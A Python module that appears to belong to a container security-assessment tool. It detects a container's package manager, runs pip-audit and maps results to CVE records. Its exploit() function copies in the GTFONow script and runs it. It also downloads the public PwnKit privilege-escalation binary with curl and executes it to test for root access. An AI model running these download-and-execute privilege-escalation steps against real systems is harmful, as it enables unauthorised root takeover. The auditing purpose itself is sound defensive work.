#!/usr/bin/python3
################################################################################
# @file      docker.py
# @brief     
# @date      Sa Jul 2025
# @author    
# 
# PROJECT:   src
# 
# MODIFIED:  Sat Jul 19 2025
# BY:        
# 
# Copyright (c) 2025 
# 
################################################################################

import io
import tarfile
from tqdm import tqdm
import json
from packaging.version import Version
from .challenge import write_data
from .constants import *
from .utils import *
from rich.progress import track

# https://docker-py.readthedocs.io/en/stable/index.html
# https://docker-py.readthedocs.io/en/stable/containers.html

AVAILABLE = [
	[
		"apt -h && apt-get -h", (	# Test
		1,							# Header when listing installed packages
		"apt list --installed",		# List installed packages
		"apt-get install -y libssl-dev openssl wget tar make python3-venv",	# Install dependencies for pip
		"apt-get update -y",		# Update
		"apt-get upgrade -y",		# Upgrade
		"apt-get autoremove -y"		# Remove unused
	)],
	[
		"dnf", (					# Test
		6,							# Header when listing installed packages
		"dnf list installed",		# List installed packages
		"dnf install -y openssl openssl-devel wget tar make",	# Install dependencies for pip
		"dnf check-update -y",		# Update
		"dnf upgrade -y --refresh --skip-broken --nobest",	# Upgrade
		"dnf autoremove -y"			# Remove unused
	)],
	[
		"yum", (					# Test
		6,							# Header when listing installed packages
		"yum list installed",		# List installed packages
		"yum install -y openssl openssl-devel wget tar make",	# Install dependencies for pip
		"yum check-update -y",		# Update
		"yum upgrade -y --refresh --skip-broken --nobest",	# Upgrade
		"yum autoremove -y"			# Remove unused
	)],
	[
		"rpm --version", (
			0,
			"rpm -qa --queryformat '%{NAME}/now %{VERSION}\n'",
			"true",
			"true",
			UPGRADE_NON_AVAILABLE,
			"true"
		)
	],
	[
		"rpm --version", (
			0,
			"rpm -qa --queryformat '%{NAME}/now %{VERSION}\n'",
			"true",
			"true",
			UPGRADE_NON_AVAILABLE,
			"true"
		)
	],
	[
		"apk version", (
			0,
			'sh -c "apk info -v | sed -E \'s/-([0-9])/\\/now \\1/\'"',
			"apk add --no-cache openssl-dev openssl wget tar make",
			"apk update",
			"apk upgrade",
			"true"
		)
	]
]
def determine_pkg_mngr(container: object) -> tuple[int, str, str, str, str, str, str] | tuple[None, None, None, None, None, None, None]:
	for i in range(len(AVAILABLE)):
		exit_code, _ = container.exec_run(AVAILABLE[i][0])
		if exit_code == 0:
			return AVAILABLE[i][1]
	return None, None, None, None, None, None

DESC_LEN = 12

def container_exec_run(container: object, cmd: str | list[str], good_status: list[int] = [0], desc: str = "", stderr_on_last: bool = True, **kwargs):
	if isinstance(cmd, list):
		last_output = ""
		desc = f"%-{DESC_LEN}s" % desc
		for i in track(range(len(cmd)), description=desc):
			last_output = container_exec_run(container, cmd[i], good_status, stderr=(i == len(cmd)-1 and stderr_on_last), **kwargs)
		return last_output

	exit_code, output = container.exec_run(cmd, **kwargs)
	if exit_code not in good_status:
		output = output.decode('unicode_escape')
		if len(output) > 325:
			output = output[0:160] + " ... " + output[-160:]
		raise Exception(f"'{cmd}' exited with status {exit_code}: {output}")
	return output

def pip_audit(container: object, update: str, install_pip_dep: str, py_version: str) -> list[dict]:
	PY_VERSION = "3.9.23"
	PY_USE_VERSION = "3"
 
	container_exec_run(
		container, [
			update,
			install_pip_dep
		],
		desc = "pip deps",
		good_status=[0,100], # RedHat exit status on update
	)

	# If version is below 3.9, upgrade
	if Version(py_version) < Version("3.9.0.0"):
		container_exec_run(
			container, [
				f"wget https://www.python.org/ftp/python/{PY_VERSION}/Python-{PY_VERSION}.tgz",
				f"tar xzvf Python-{PY_VERSION}.tgz",
			],
			desc = f"Dl. Py {PY_VERSION}",
			workdir="/tmp"
		)
		container_exec_run(
			container, [
				"./configure",
				"make",
				"make install",
			],
			desc = f"Python {PY_VERSION}",
			workdir=f"/tmp/Python-{PY_VERSION}"
		)
		PY_USE_VERSION = "3.9"

	# VENV_PATH = "/tmp"
	# VENV_BIN = "/tmp/venv/bin"
	# container_exec_run(
	# 	container, f"python{PY_USE_VERSION} -m venv venv",
	# 	desc = "Setup venv",
	# 	workdir = VENV_PATH
	# )
 
	# Download pip
	exit_code, _ = container.exec_run("pip install -U pip")
	if exit_code != 0:
		container_exec_run(
			container, [
				f"wget -O /tmp/get-pip.py https://bootstrap.pypa.io/get-pip.py",
				f"python{PY_USE_VERSION} /tmp/get-pip.py",
			],
			desc = "pip"
		)
	container_exec_run(
		container,
		f"pip{PY_USE_VERSION} install --ignore-installed --break-system-packages pip-audit",
		desc = "pip-audit"
	)
	# Exit status 1 when vulnerabilities are found
	output = container_exec_run(container, f"pip-audit --desc off --aliases --format json", [0,1])
	# print(output.decode("unicode_escape"))
	output_json = json.loads("".join(output.decode("unicode_escape").split("\n")[1:-1]))
	cves_json = []
	# print(output_json)
	for pkg in output_json["dependencies"]:
		vulns = pkg.get("vulns")
		if not vulns:
			continue
		cves_pkg = []
		year = 0
		num = 0
		for vuln in vulns:
			try:
				cveId = next((item for item in vuln.get("aliases") if item.startswith("CVE-")), None)
				# print(cveId)
				if not cveId:
					# eprint(vuln)
					continue
				year, num = cveId.split("-")[1:]
				cve_prefix = ""
				if len(num) < 3:
					cve_prefix = "0"
					num = "%04d" % int(num)
				else:
					cve_prefix = num[:-3]
				
				data = {}
				with open(f"{CVELIST_DIRECTORY}/cves/{year}/{cve_prefix}xxx/CVE-{year}-{num}.json", "r", encoding="utf-8") as f:
					data = json.load(f) #, object_hook=deserialize)
				# print(data)
				data["cveId"] = data["cveMetadata"]["cveId"]
				data["cvssMaxScore"] = max_score(data.get("cvss", {"metrics": {}})["metrics"] or {})
				cves_pkg.append(write_data(data))
			except Exception as e:
				eprint(f"CVE-{year}-{num}", e)
		if cves_pkg:
			cves_json.append({
				"product": pkg["name"],
				"version": pkg["version"],
				"cves": cves_pkg
			})
	return cves_json

def exploit(container: object, py_has: bool):
	container_exec_run(
		container, [
			"apt install -y python3",
			"adduser user1000 --disabled-password",
			"su user1000",
		],
		desc = "Setting up non-sudo user"
	)
	# if py_has:
	def copy_to_container(container: object, src: str, dst_dir: str):
		""" src shall be an absolute path """
		stream = io.BytesIO()
		with tarfile.open(fileobj=stream, mode='w|') as tar, open(src, 'rb') as f:
			info = tar.gettarinfo(fileobj=f)
			info.name = os.path.basename(src)
			tar.addfile(info, f)

		container.put_archive(dst_dir, stream.getvalue())

	copy_to_container(container, os.path.abspath("src/exploit/gtfonow.py"), "/home/user1000")
	exit_code, output = container.exec_run("ls -l", workdir="/home/user1000")
	print(output.decode("unicode_escape").strip())
 
	output = container_exec_run(
		container,
		"python3 gtfonow.py --auto --level 2 --risk 2 --command whoami",
		desc = "Testing GTFNow",
		workdir = "/home/user1000"
	)
	print("GTFONow:", output.decode("unicode_escape").strip())
	
	arch = ""
	exit_code, output = container.exec_run("uname -m")
	if output.decode("unicode_escape").strip() != "x86_64":
		arch = "32"
	output = container_exec_run(
		container, [
			f"curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit{arch} -o PwnKit",
			"chmod +x ./PwnKit",
			"./PwnKit whoami"
		],
		desc = "Testig PwnKit",
		workdir="/home/user1000"
	)
	print("GTFONow:", output.decode("unicode_escape").strip())